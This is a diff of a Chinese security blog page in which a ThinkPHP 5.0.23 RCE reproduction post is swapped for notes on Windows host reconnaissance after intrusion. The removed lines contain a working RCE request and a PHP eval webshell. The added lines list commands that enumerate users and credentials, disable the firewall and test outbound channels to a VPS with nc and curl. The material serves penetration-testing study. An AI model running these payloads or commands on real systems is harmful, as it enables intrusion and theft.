@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="thinkphp 5.0.23 rce 漏洞复现, budtit&#39;blog">
+    <meta name="keywords" content="主机信息收集, budtit&#39;blog">
     <meta name="description" content="因为迷茫，所以滞留；因为迷茫，所以错过。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>thinkphp 5.0.23 rce 漏洞复现 | budtit&#39;blog</title>
+    <title>主机信息收集 | budtit&#39;blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -203,12 +203,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">thinkphp 5.0.23 rce 漏洞复现</h1>
+                    <h1 class="description center-align post-title">主机信息收集</h1>
                 </div>
             </div>
         </div>
@@ -328,8 +328,8 @@
                                 <span class="chip bg-color">渗透测试</span>
                             </a>
                         
-                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-                                <span class="chip bg-color">漏洞复现</span>
+                            <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+                                <span class="chip bg-color">信息收集</span>
                             </a>
                         
                     </div>
@@ -340,8 +340,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="post-category">
-                                漏洞利用
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                渗透测试
                             </a>
                         
                     </div>
@@ -353,7 +353,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-01-27
+                    2021-02-06
                 </div>
                 
 
@@ -362,7 +362,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    259
+                    737
                 </div>
                 
 
@@ -387,38 +387,116 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>thinkphp 5.0.23 rce漏洞利用</p>
+                <p>学习笔记</p>
 <a id="more"></a>
-<h2 id="thinkphp介绍"><a href="#thinkphp介绍" class="headerlink" title="thinkphp介绍"></a>thinkphp介绍</h2><p>thinkphp是一个快速、兼容而且简单的轻量级国产php开发框架，支持windows/Unix/linux等服务器环境，并且有相当多的CMS是在thinkphp基础上二次开发的。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">vulhub</a>搭建环境，过程不赘述。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>抓包并直接发送下面的流量包，即可利用漏洞进行远程代码执行</p>
-<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1
-Host: IP:PORT
-Accept-Encoding: gzip, deflate
-Accept: *&#x2F;*
-Accept-Language: en
-User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)
-Connection: close
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 79
 
-_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;pwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>发包可见，命令执行成功</p>
-<div align="center">
+<h2 id="内网环境分析"><a href="#内网环境分析" class="headerlink" title="内网环境分析"></a>内网环境分析</h2><ul>
+<li>内网基础环境判断：IP、网关、DNS、host文件、端口、服务、代理等</li>
+<li>主机所在位置：办公区、核心DB、生产区等</li>
+<li>主机充当的角色：普通服务器、办公电脑、文件服务器、代理服务器等</li>
+<li>进出口流量分析：通常可以判断防火墙等安全策略，检查流量和端口限制<ul>
+<li>TCP协议：<ul>
+<li>vps：nc -lvvp 8080</li>
+<li>target：nc vps -ip 8888</li>
+</ul>
+</li>
+<li>HTTP协议：<ul>
+<li>target：curl vps-ip 80</li>
+</ul>
+</li>
+<li>ICMP协议：<ul>
+<li>ping命令</li>
+</ul>
+</li>
+<li>DNS协议：<ul>
+<li>target： nslookup <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> vps-ip</li>
+<li>dig @vsp-ip <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="信息收集手段"><a href="#信息收集手段" class="headerlink" title="信息收集手段"></a>信息收集手段</h2><ol>
+<li>内网网段扫描</li>
+<li>文件共享、FTP连接记录、浏览器访问记录等</li>
+<li>R&amp;S信息</li>
+</ol>
+<h2 id="信息收集常用命令"><a href="#信息收集常用命令" class="headerlink" title="信息收集常用命令"></a>信息收集常用命令</h2><h3 id="用户信息收集"><a href="#用户信息收集" class="headerlink" title="用户信息收集"></a>用户信息收集</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看本机用户列表</span>
+net user
+<span class="token comment">#获取本地管理员信息</span>
+net localgroup administrators
+<span class="token comment">#查看当前在线用户和会话</span>
+quser
+query user
+query user <span class="token operator">||</span> qwinsta
+<span class="token comment">#查当前用户在目标系统中的具体权限</span>
+<span class="token function">whoami</span> /all
+<span class="token comment">#查看当前权限</span>
+<span class="token function">whoami</span> <span class="token operator">&amp;&amp;</span> <span class="token function">whoami</span> /priv
+<span class="token comment">#查当前机器中所有的组名</span>
+net localgroup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查询网络配置信息。</span>
+ipconfig /all
+<span class="token comment">#查询操作系统及软件信息</span>
+systeminfo <span class="token operator">|</span> findstr /B /C:<span class="token string">"OS Name"</span> /C:<span class="token string">"OS Version"</span> <span class="token comment"># 英文系统</span>
+systeminfo <span class="token operator">|</span> findstr /B /C:<span class="token string">"OS 名称"</span> /C:<span class="token string">"OS 版本"</span> <span class="token comment">#中文系统</span>
+<span class="token comment">#查看当前系统版本</span>
+wmic OS get Caption,CSDVersion,OSArchitecture,Version
+<span class="token comment">#查看系统体系结构</span>
+<span class="token builtin class-name">echo</span> %PROCESSOR_ARCHITECTURE%
+<span class="token comment">#查询本机服务信息</span>
+wmic <span class="token function">service</span> list brief
+<span class="token comment">#查看安装的软件的版本、路径等</span>
+wmic product get name, version
+powershell <span class="token string">"Get-WmiObject -class Win32_Product |Select-Object -Property name, version"</span>
+<span class="token comment">#查询进程信息</span>
+tasklist
+wmic process list brief
+<span class="token comment">#查看启动程序信息</span>
+wmic startup get command,caption
+<span class="token comment">#查看主机开机时间</span>
+net statistics workstation
+<span class="token comment">#列出或断开本地计算机与所连接的客户端的对话</span>
+net session
+<span class="token comment">#查看远程连接信息</span>
+cmdkey /l
+<span class="token comment">#查看补丁列表</span>
+systeminfo <span class="token operator">|</span> findstr KB
+<span class="token comment">#查看补丁的名称、描述、ID、安装时间等</span>
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+<span class="token comment">#查看杀软</span>
+WMIC /Node:localhost /Namespace:<span class="token punctuation">\</span><span class="token punctuation">\</span>root<span class="token punctuation">\</span>SecurityCenter2 Path AntiVirusProduct Get displayName/Format:List
+<span class="token comment">#查看本地密码策略</span>
+net accounts
+<span class="token comment">#查看hosts文件：</span>
+<span class="token function">cat</span> /etc/hosts <span class="token comment"># linux</span>
+<span class="token builtin class-name">type</span> c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>drivers<span class="token punctuation">\</span>etc<span class="token punctuation">\</span>hosts  <span class="token comment"># windows</span>
+<span class="token comment">#查看dns缓存（仅windows）</span>
+ipconfig /displaydns <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="网络信息收集"><a href="#网络信息收集" class="headerlink" title="网络信息收集"></a>网络信息收集</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看本地密码策略</span>
+<span class="token comment">#查看本机所有的tcp,udp端口连接及其对应的pid</span>
+<span class="token function">netstat</span> -ano
+<span class="token comment">#查看本机所有的tcp,udp端口连接,pid及其对应的发起程序</span>
+<span class="token function">netstat</span> -anob
+<span class="token comment">#查看路由表和arp缓存</span>
+route print
+arp -a
+<span class="token comment">#查看本机共享列表和可访问的域共享列表 （445端口）</span>
+net share
+wmic share get name,path,status
+<span class="token comment">#磁盘映射</span>
+net use k: <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>c$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="防火墙信息收集"><a href="#防火墙信息收集" class="headerlink" title="防火墙信息收集"></a>防火墙信息收集</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#关闭防火墙(Windows Server 2003 以前的版本)</span>
+netsh firewall <span class="token builtin class-name">set</span> opmode disable
+<span class="token comment">#关闭防火墙(Windows Server 2003 以后的版本)</span>
+netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off
+<span class="token comment">#查看防火墙配置(netsh命令也可以用作端口转发)</span>
+netsh firewall show config
+<span class="token comment">#查看配置规则</span>
+netsh advfirewall firewall show rule <span class="token assign-left variable">name</span><span class="token operator">=</span>all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/2021/thinkphp5.0.23rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/0.1.png"></p>
-</div>
 
-<h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>利用命令执行写入一句话木马，注意一个坑，$符号会被过滤掉，原因不明，因此需要$进行转义：<code>echo &quot;&lt;?php @eval(\$_POST[&#39;dack&#39;])?&gt;&quot; &gt; 7.php</code></p>
-<div align="center">
 
-<p><img src="/2021/thinkphp5.0.23rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p>
-</div>
-通过蚁剑进行连接，成功获取shell。
-<div align="center">
-
-<p><img src="/2021/thinkphp5.0.23rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p>
-</div>
                 
             </div>
             <hr/>
@@ -436,8 +514,8 @@ _method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server
                                     <span class="chip bg-color">渗透测试</span>
                                 </a>
                             
-                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-                                    <span class="chip bg-color">漏洞复现</span>
+                                <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+                                    <span class="chip bg-color">信息收集</span>
                                 </a>
                             
                         </div>
@@ -487,6 +565,59 @@ _method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
+                <a href="/2021/%E5%9F%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="域学习笔记">
+                        
+                        <span class="card-title">域学习笔记</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-02-06
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
+                    </a>
+                    
+                    <a href="/tags/windows/">
+                        <span class="chip bg-color">windows</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
                 <a href="/2021/%E5%AF%B9SQL%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B%E5%9C%A8%E6%B3%A8%E9%87%8A%E6%96%B9%E5%BC%8F%E7%9A%84%E6%80%9D%E8%80%83/">
                     <div class="card-image">
                         
@@ -503,9 +634,9 @@ _method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-02-02
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-02
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -527,55 +658,6 @@ _method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server
                     
                     <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
                         <span class="chip bg-color">SQL注入</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Weblogic(CVE-2017-10271)漏洞复现">
-                        
-                        <span class="card-title">Weblogic(CVE-2017-10271)漏洞复现</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            CVE-2017-10271学习
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-26
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Budtit
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                        <span class="chip bg-color">渗透测试</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
